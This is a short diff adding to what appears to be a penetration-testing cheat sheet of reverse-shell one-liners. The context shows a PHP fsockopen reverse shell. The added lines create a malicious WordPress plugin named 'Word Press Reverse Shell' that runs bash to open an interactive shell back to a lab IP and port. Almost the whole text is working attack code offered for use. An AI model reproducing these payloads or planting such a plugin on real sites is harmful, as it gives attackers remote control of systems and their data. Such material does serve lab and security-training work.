@@ -187,6 +187,15 @@ php
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+nano wordpress.php
+<?php
+/**
+*Plugin Name: Word Press Reverse Shell
+*Author: Me
+*/
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.188/9999 0>&1'");
+?>
+
 ```
 
 nc
